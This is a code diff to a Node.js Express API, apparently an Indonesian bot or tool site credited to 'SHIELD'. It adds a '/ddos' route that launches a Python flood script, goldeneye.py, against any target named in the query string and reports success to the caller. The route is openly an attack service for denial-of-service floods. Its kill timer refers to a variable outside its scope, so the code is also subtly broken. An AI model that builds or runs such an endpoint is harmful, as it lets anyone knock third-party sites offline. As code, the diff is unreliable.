@@ -7,7 +7,7 @@ const message = { status: true, creator: 'SHIELD', Url: '[URL] Masukan Parameter
 const {Visitor} = require('../database/model');
 const textpro = require("../lib/data/textpro");
 const photooxy = require("../lib/data/photooxy.js");
-
+const { spawn } = require('child_process');
 
 async function apiFunc(req, res) {
   return new Promise(async (resolve, reject) => {
@@ -50,6 +50,35 @@ router.all('/openai', async (req, res) => {
     res.send(err.toString());
   }
 });
+//==  DDOS  ==\\
+router.all('/ddos', async(req, res) => {
+try {
+  const pyname = "./goldeneye.py";
+  const args = [req.query.target];
+  const pythonProcess = spawn('python3', [pyname, ...args]);
+
+// Tangani data stdout dari proses Python
+pythonProcess.stdout.on('data', (data) => {
+  console.log(`Python stdout: ${data}`);
+});
+
+// Tangani data stderr dari proses Python
+pythonProcess.stderr.on('data', (data) => {
+  console.error(`Python stderr: ${data}`);
+});
+
+// Tangani keluaran proses Python
+pythonProcess.on('close', (code) => {
+  console.log(`Success`);
+});
+res.json({ status: true, creator: 'SHIELD', result: "Succes Dikirim Selama 120 detik" });
+  } catch (err) {
+    res.json(err.message);
+  }
+setTimeout(() => {
+  pythonProcess.kill(); // Hentikan proses Python
+},  50 * 1000);
+})
 
 //==    WIBU    ==\\
 
